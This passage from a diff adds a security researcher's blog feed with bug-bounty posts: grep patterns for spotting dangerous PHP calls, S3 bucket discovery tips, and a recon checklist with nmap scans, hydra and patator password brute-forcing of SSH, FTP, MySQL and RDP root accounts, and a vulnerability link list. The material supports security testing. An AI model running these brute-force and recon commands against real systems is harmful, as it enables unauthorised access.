+&lt;h2 id=&quot;code-analysis&quot;&gt;Code analysis&lt;/h2&gt;
+
+&lt;p&gt;Time to dig deeper! For each themes/plugins, use regexp to locate dangerous functions.
+Test everything on your local install before testing your target.&lt;/p&gt;
+
+&lt;p&gt;SQL statements:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;egrep -ri 'select|insert|update|delete' . | grep -i &quot;.php&quot; | egrep -i &quot;select.*FROM|insert.*INTO|update.*SET|delete.*FROM&quot;
+egrep -ri '\-&amp;gt;prepare' . | grep -i &quot;.php&quot; | egrep -i '\-&amp;gt;prepare'
+egrep -ri '\$_SERVER|\$_REQUEST|\$_GET|\$_POST|\$_COOKIE' . | grep -i &quot;.php&quot; | egrep -i '\$_SERVER\[|\$_REQUEST\[|\$_GET\[|\$_POST\[|\$_COOKIE\['
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;File system interaction:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;egrep -ri 'fopen|file_get_contents|file_put_contents|fread|fwrite' . | grep -i &quot;.php&quot; | egrep -i &quot;fopen\s*\(|file_get_contents\s*\(|file_put_contents\s*\(|fread\s*\(|fwrite\s*\(&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Command execution:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;egrep -ri 'eval|system|exec|passthru' . | grep -i &quot;.php&quot; | egrep -i &quot;eval\s*\(|system\s*\(|exec\s*\(|passthru\s*\(&quot;
+egrep -ri 'assert|create_function|preg_replace' . | grep -i &quot;.php&quot; | egrep -i &quot;assert\s*\(|create_function\s*\(|preg_replace\s*\(&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;File inclusion:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;egrep -ri 'include|require' . | grep -i &quot;.php&quot; | egrep -i &quot;include\s*\(|include_once\s*\(|require\s*\(|require_once\s*\(&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Custom headers:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;egrep -ri 'header|setcookie|content-disposition' . | grep -i &quot;.php&quot; | egrep -i &quot;header\s*\(|setcookie\s*\(|content-disposition\s*\(&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;boring-stuff&quot;&gt;Boring stuff&lt;/h2&gt;
+
+&lt;p&gt;Finally, you can use the same technics you use on other website. Try to find endpoints from Google, Wayback Machine, etc… and test SQLi, XSS and so on…
+Far from exhaustive, you also need to check authentication deeper, specially if oauth is part of the party.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/wordpress-testing/&quot;&gt;Wordpress testing&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on September 12, 2017.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Kick the bucket]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/kick-the-bucket/" />
+  <id>http://10degres.net/kick-the-bucket</id>
+  <published>2017-08-01T00:00:00+01:00</published>
+  <updated>2017-08-01T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;I already wrote &lt;a href=&quot;/playing-with-s3-buckets/&quot;&gt;a post about Amazon S3 buckets&lt;/a&gt; but they became so popular these last weeks  that many people explain what is a bucket, what is the danger and how to exploit misconfiguration. My goal here is more: how/where to find those vulnerable buckets.&lt;/p&gt;
+
+&lt;p&gt;First I assume you already know the basics, if not, you can read the excellent article from &lt;a href=&quot;https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-controls-taking-full-control-over-your-assets/&quot; target=&quot;_blank&quot; class=&quot;flashlink&quot;&gt;Frans Rosen on Detectify&lt;/a&gt;.
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;how-a-bucket-name-looks-like&quot;&gt;How a bucket name looks like?&lt;/h2&gt;
+&lt;p&gt;After analyzing alot of buckets, here are the most common pattern I found:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&amp;lt;main_name&amp;gt;&amp;lt;separator&amp;gt;&amp;lt;word&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;word&amp;gt;&amp;lt;separator&amp;gt;&amp;lt;main_name&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;subdomain&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;highlighter-rouge&quot;&gt;main_name&lt;/code&gt; usually is the name of the company or the domain and &lt;code class=&quot;highlighter-rouge&quot;&gt;separator&lt;/code&gt; usually is a dot &lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt; or a dash &lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;, example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10degres-static&lt;/li&gt;
+  &lt;li&gt;prod.10degres&lt;/li&gt;
+  &lt;li&gt;assets.10degres.net&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;It’s also very common to find multiple “level” of separation, example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;10degres-backups-2016&lt;/li&gt;
+  &lt;li&gt;dev.www.10degres.net&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Pretty rare, but sometimes separators are mixed:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;img-dev.10degres.net&lt;/li&gt;
+  &lt;li&gt;static.10-degres.net&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;how-to-access-a-bucket&quot;&gt;How to access a bucket?&lt;/h2&gt;
+
+&lt;p&gt;There is 4 ways to access a bucket:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;subdomain of s3.amazonaws.com, ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;https://xxxxxxxxxx.s3.amazonaws.com&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;subdirectory of s3.amazonaws.com, ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;https://s3.amazonaws.com/xxxxxxxxxx&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;subdomain of Cloudfront, ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;https://xxxxxxxxxx.cloudfront.net&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;awscli&lt;/code&gt; the command line environment tool for AWS, ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;aws s3 ls s3://xxxxxxxxxx&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;From here you probably already guessed the next chapter…&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-find-buckets&quot;&gt;How to find buckets?&lt;/h2&gt;
+
+&lt;p&gt;To Find buckets, you can use the tools you already use when you perform recon on a new program/domain/host:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;sudbomain discovery: Sublist3r, dnsrecon, altdns, &lt;a href=&quot;https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=cloudfront.net&quot; target=&quot;_blank&quot;&gt;threadcrowd.org&lt;/a&gt;…
+&lt;img src=&quot;/images/s3bucket-theharvester.png&quot; alt=&quot;Sudbomain discovery with theharvester&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;subdirectory discovery: dirb, wfuzz, gobuster…
+&lt;img src=&quot;/images/s3bucket-wfuzz.png&quot; alt=&quot;Subdirectory discovery witf WFuzz&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;both: Google, Burp Suite and many others…
+&lt;img src=&quot;/images/s3bucket-burp.png&quot; alt=&quot;Subdomain discovery with Burp Suite&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;dedicated-tools&quot;&gt;Dedicated tools&lt;/h2&gt;
+
+&lt;p&gt;Some dedicated tools have been released to discover buckets:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://digi.ninja/projects/bucket_finder.php&quot; target=&quot;_blank&quot;&gt;Bucket Finder&lt;/a&gt; by DigiNinja&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/nahamsec/lazys3&quot; target=&quot;_blank&quot;&gt;laszyS3&lt;/a&gt; by Jobert Abma and Ben Sadeghipour&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/michenriksen/bucketlist&quot; target=&quot;_blank&quot;&gt;bucketlist&lt;/a&gt; by Michen Riksen&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/gwen001/s3-buckets-finder&quot; target=&quot;_blank&quot;&gt;s3-bucket-finder&lt;/a&gt; by me&lt;br /&gt;
+I also wrote &lt;a href=&quot;/assets/cloudfront.txt&quot; target=&quot;_blank&quot;&gt;a small script&lt;/a&gt; that try to determine what is behind a Cloudfront subdomain.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;additionnal-notes&quot;&gt;Additionnal notes&lt;/h2&gt;
+
+&lt;p&gt;Even if a bucket is read only, you can report it if the datas available are hot, take a look at Hackerone where the researcher wrote a &lt;a href=&quot;https://hackerone.com/reports/202725&quot; target=&quot;_blank&quot; class=&quot;flashlink&quot;&gt;report to Mapbox&lt;/a&gt; and got a nice reward.
+&lt;br /&gt;&lt;br /&gt;
+Even if a bucket is empty, you can also report it, the danger still here, a hacker could use the place to store hacked datas (movies, software…) or serve malicious files.
+&lt;br /&gt;&lt;br /&gt;
+A bucket can be readable from the command line tool &lt;code class=&quot;highlighter-rouge&quot;&gt;awscli&lt;/code&gt; but not with your browser, try both way.
+&lt;br /&gt;&lt;br /&gt;
+All files contained in a bucket can have different permissions, test them all.
+&lt;br /&gt;&lt;br /&gt;
+A bucket can be configured to serve only one region, you will get a very specific message in that case, so test all region to find the good one (&lt;a href=&quot;http://docs.aws.amazon.com/general/latest/gr/rande.html#s3_region&quot; target=&quot;_blank&quot; class=&quot;flashlink&quot;&gt;see the region list&lt;/a&gt;).
+&lt;br /&gt;&lt;br /&gt;
+Some buckets are not reachable via &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, you should prefer &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;.
+&lt;br /&gt;&lt;br /&gt;
+At this time, there is no real way to know the owner of a bucket. The only thing you can do, if you have access to the ACL (via the command line method &lt;code class=&quot;highlighter-rouge&quot;&gt;get-bucket-acl&lt;/code&gt;), is to compare the owner of two different buckets. So take care when/who you send a report.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/kick-the-bucket/&quot;&gt;Kick the bucket&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on August 01, 2017.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[My way to go]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/my-way-to-go/" />
+  <id>http://10degres.net/my-way-to-go</id>
+  <published>2017-04-19T00:00:00+01:00</published>
+  <updated>2017-04-19T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;project&quot;&gt;Project&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Find Amazon s3 buckets:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;s3-buckets-bruteforce /opt/SecLists/mine/s3-buckets.txt &amp;lt;project&amp;gt;-&lt;/code&gt;&lt;br /&gt;
+if found: &lt;code class=&quot;highlighter-rouge&quot;&gt;s3-buckets-extractor &amp;lt;bucket&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Explore GitHub account:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;github-search -o &amp;lt;project&amp;gt; -r 1000 -s password&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;gitrob analyze quizlet --no-color --no-server&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;domain&quot;&gt;Domain&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Check expiration date: &lt;code class=&quot;highlighter-rouge&quot;&gt;whois &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Find subdomains:
+    &lt;ul&gt;
+      &lt;li&gt;Google: &lt;code class=&quot;highlighter-rouge&quot;&gt;site:&amp;lt;domain&amp;gt; -www&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Test zone transfer: &lt;code class=&quot;highlighter-rouge&quot;&gt;dnsrecon -t axfr -d &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Brute force:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;dnsrecon -t brt -D /opt/SecLists/Discovery/DNS/subdomains-top1mil-20000.txt &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sublist3r -d &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;altdns -i dns.txt -o /tmp/perm -w /opt/SecLists/Discovery/DNS/subdomains-top1mil-20000.txt -r -s final.txt&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;and others&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;theharvester -d &amp;lt;domain&amp;gt; -b all -l 1000 -n&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;subthreat &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;crtsh &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;server&quot;&gt;Server&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Find open ports:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;portscan_nc &amp;lt;ip&amp;gt; 1 65535&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -A -T4 -sS -p 1-65535 --open &amp;lt;ip&amp;gt; -Pn&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -A -T4 -sU --top-ports=1000 --open &amp;lt;ip&amp;gt; -Pn&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;21/tcp:&lt;br /&gt;
+test anonymous login: &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 21 --script ftp-anon &amp;lt;ip&amp;gt; -Pn&lt;/code&gt;&lt;br /&gt;
+try brute force:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -F -L /opt/SecLists/Usernames/top_shortlist.txt -P /opt/SecLists/Passwords/best1050.txt ftp://&amp;lt;ip&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;patator ftp_login host=&amp;lt;ip&amp;gt; user=root password=FILE0 0=/opt/SecLists/Passwords/passwords_john.txt&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;22/tcp: try brute force root password:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -F -l root -P /opt/SecLists/Passwords/best1050.txt ssh://&amp;lt;ip&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;patator ssh_login host=&amp;lt;ip&amp;gt; user=root password=FILE0 0=/opt/SecLists/Passwords/passwords_john.txt&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;25/tcp: test smtp user enumeration:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp-user-enum -p 25 -M VRFY -U /opt/SecLists/metasploit/unix_users.txt -t &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;161/tcp:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;onesixtyone &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;3306/tcp: try brute force root password&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -F -l root -P /opt/SecLists/Passwords/best1050.txt mysql://&amp;lt;ip&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;patator mysql_login host=&amp;lt;ip&amp;gt; user=root password=FILE0 0=/opt/SecLists/Passwords/passwords_john.txt&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;3389/tcp: try brute force Administrator password&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;hydra -F -l Administrator -P /opt/SecLists/Passwords/best1050.txt rdp://&amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;if web, perform same test than a host.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;host&quot;&gt;Host&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Try most common Google dorks&lt;/li&gt;
+  &lt;li&gt;Check SSL certificate: &lt;code class=&quot;highlighter-rouge&quot;&gt;testssl --color 0 -U &amp;lt;host&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Test CRLF: &lt;code class=&quot;highlighter-rouge&quot;&gt;testcrlf -o &amp;lt;host&amp;gt; -p http&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Test CORS: &lt;code class=&quot;highlighter-rouge&quot;&gt;testcors -o &amp;lt;host&amp;gt; -p http&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Test open redirect: &lt;code class=&quot;highlighter-rouge&quot;&gt;ultimate-open-redirect -t http://&amp;lt;host&amp;gt; -z 10degres.net&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Find technologies:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;wappalyzer http://&amp;lt;host&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;whatweb -v http://&amp;lt;host&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Quick test:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;dirb http://&amp;lt;host&amp;gt; /opt/SecLists/mine/myhardw.txt -S&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Find directories:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nikto -h http://&amp;lt;host&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;dirb http://&amp;lt;host&amp;gt; /opt/SecLists/dirb/big.txt -S&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz -c -z file,/opt/SecLists/dirb/big.txt --hc 404 http://&amp;lt;host&amp;gt;/FUZZ&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Find XSS and SQL injection point:&lt;br /&gt;
+Google: &lt;code class=&quot;highlighter-rouge&quot;&gt;site:&amp;lt;host&amp;gt; inurl:&quot;&amp;amp;&quot;&lt;/code&gt;&lt;br /&gt;
+Lynx: &lt;code class=&quot;highlighter-rouge&quot;&gt;lynx -dump http://www.google.com/search?q=site:&amp;lt;host&amp;gt;+inurl:&quot;&amp;amp;&quot;&amp;amp;num=5000&lt;/code&gt;&lt;br /&gt;
+wget: &lt;code class=&quot;highlighter-rouge&quot;&gt;wget --random-wait -r -l4 --spider -D &amp;lt;host&amp;gt; http://&amp;lt;host&amp;gt; -o ouput.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;application&quot;&gt;Application&lt;/h2&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/my-way-to-go/&quot;&gt;My way to go&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on April 19, 2017.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Vulnerabilities list]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/vulnerabilities-list/" />
+  <id>http://10degres.net/vulnerabilities-list</id>
+  <published>2017-04-05T00:00:00+01:00</published>
+  <updated>2017-04-05T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;Here is a non exhausted list of vulnerabilities that I use as a reminder with links for reference.
+It’s based on many different &lt;a href=&quot;/resources/&quot;&gt;resources&lt;/a&gt; available on the Internet.
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/vuln-sql-injection/&quot;&gt;SQL injection aka SQLi&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/vuln-cross-site-scripting/&quot;&gt;Cross-site scriptting aka XSS&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/vuln-subdomain-takeover/&quot;&gt;Subdomain takeover&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/vuln-relative-path-overwrite/&quot;&gt;Relative path overwrite / Path-relative style sheet import&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/vuln-cross-site-request-forgery/&quot;&gt;Cross-site request forgery aka CSRF&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/vuln-clickjacking/&quot;&gt;Clickjacking&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/vuln-cross-origin-resource-sharing/&quot;&gt;Cross-origin resource sharing aka CORS&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cookies&quot;&gt;Cookies&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500200_sslcookiewithoutsecureflagset&quot; target=&quot;_blank&quot;&gt;SSL cookie without secure flag set&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500300_cookiescopedtoparentdomain&quot; target=&quot;_blank&quot;&gt;Cookie scoped to parent domain&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400a00_duplicatecookiesset&quot; target=&quot;_blank&quot;&gt;Duplicate cookies set&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500600_cookiewithouthttponlyflagset&quot; target=&quot;_blank&quot;&gt;Cookie without HttpOnly flag set&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500b00_cookiemanipulationdombased&quot; target=&quot;_blank&quot;&gt;Cookie manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500b01_cookiemanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;Cookie manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500b02_cookiemanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;Cookie manipulation (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;headers-manipulation&quot;&gt;Headers manipulation&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200200_httpresponseheaderinjection&quot; target=&quot;_blank&quot;&gt;HTTP response header injection aka CRLF&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400100_refererdependentresponse&quot; target=&quot;_blank&quot;&gt;Referer-dependent response&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400110_xforwardedfordependentresponse&quot; target=&quot;_blank&quot;&gt;X-Forwarded-For dependent response&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400120_useragentdependentresponse&quot; target=&quot;_blank&quot;&gt;User agent-dependent response&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500c00_ajaxrequestheadermanipulationdombased&quot; target=&quot;_blank&quot;&gt;Ajax request header manipulation (DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500c01_ajaxrequestheadermanipulationreflecteddombased&quot; target=&quot;_blank&quot;&gt;Ajax request header manipulation (reflected DOM-based)&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00500c02_ajaxrequestheadermanipulationstoreddombased&quot; target=&quot;_blank&quot;&gt;Ajax request header manipulation (stored DOM-based)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00700100_cacheablehttpsresponse&quot; target=&quot;_blank&quot;&gt;Cacheable HTTPS response&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00800100_multiplecontenttypesspecified&quot; target=&quot;_blank&quot;&gt;Multiple content types specified&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00800400_contenttypeincorrectlystated&quot; target=&quot;_blank&quot;&gt;Content type incorrectly stated&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00800500_contenttypeisnotspecified&quot; target=&quot;_blank&quot;&gt;Content type is not specified&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;code-injection&quot;&gt;Code injection&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100c00_phpcodeinjection&quot; target=&quot;_blank&quot;&gt;PHP code injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00400900_serializedobjectinhttpmessage&quot; target=&quot;_blank&quot;&gt;Serialized object in HTTP message&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100d00_serversidejavascriptcodeinjection&quot; target=&quot;_blank&quot;&gt;Server-side JavaScript code injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100e00_perlcodeinjection&quot; target=&quot;_blank&quot;&gt;Perl code injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100f00_rubycodeinjection&quot; target=&quot;_blank&quot;&gt;Ruby code injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100f10_pythoncodeinjection&quot; target=&quot;_blank&quot;&gt;Python code injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00100f20_expressionlanguageinjection&quot; target=&quot;_blank&quot;&gt;Expression Language injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00101000_unidentifiedcodeinjection&quot; target=&quot;_blank&quot;&gt;Unidentified code injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00101080_serversidetemplateinjection&quot; target=&quot;_blank&quot;&gt;Server-side template injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00101100_ssiinjection&quot; target=&quot;_blank&quot;&gt;SSI injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200308_clientsidetemplateinjection&quot; target=&quot;_blank&quot;&gt;Client-side template injection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://portswigger.net/knowledgebase/Issues/details/00200320_javascriptinjectiondombased&quot; target=&quot;_blank&quot;&gt;JavaScript injection (DOM-based)&lt;/a&gt;&lt;br /&gt;
